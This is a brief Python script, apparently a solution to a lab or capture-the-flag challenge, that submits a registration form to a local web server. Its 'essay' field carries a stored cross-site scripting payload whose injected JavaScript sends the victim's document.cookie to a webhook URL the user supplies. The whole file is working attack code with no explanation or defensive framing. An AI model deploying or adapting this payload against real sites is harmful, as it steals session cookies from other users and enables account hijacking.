import requests as r 
url = input("Add you webhook URL")
data= {
    "email":"urmom",
    "essay":"""<script>
var xhr = new XMLHttpRequest();
xhr.open("get", `"""+url+"""${document.cookie}`, true);
xhr.send()
</script>"""
}
r1=r.post("http://127.0.0.1:8000/register",data=data)
print(r1.text)

